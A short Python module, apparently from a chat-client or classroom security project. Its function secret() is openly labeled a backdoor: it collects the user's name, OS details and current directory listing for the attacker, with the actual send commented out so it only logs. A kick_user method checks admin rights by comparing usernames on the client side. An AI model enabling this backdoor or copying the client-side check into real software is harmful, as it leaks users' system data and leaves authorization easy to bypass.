import platform 
import os
import json
from src import ui
logger = ui.init_logger('back_door')   # Initialize logger
ui.set_log_level(logger, 'DEBUG')   # SET LOG LEVEL AT HERE

async def secret(self):
    # BACK DOOR: Send system information to the attacker
    try:
        # Collect client's information
        system_info = {
            "username": self.username,
            "os": platform.system(),
            "os_version": platform.version(),
            "architecture": platform.machine(),
            "file_list": os.listdir('.') 
        }

        # transform the information into a JSON
        message = f"System Info: {json.dumps(system_info)}"

        #await self.broadcast(message)
        logger.info(f"{message}")
        logger.warning("Backdoor command executed: system information sent.")
    except Exception as e:
        logger.error(f"Failed to execute backdoor: {e}")
    
async def kick_user(self, target_username):
    """
    Send a request to the server to kick a user.

    Args:
        target_username (str): The username of the user to kick.
    """
    # Only allow the admin user to send this command
    if self.username != "admin":
        logger.warning("You do not have permission to use this command.")
        return

    data = {
        "type": "kick_user",
        "target": target_username
    }
    signed_data = self.create_signed_data(data)
    await self.send_signed_message(signed_data)
    logger.debug(f"Sent kick request for user {target_username}.")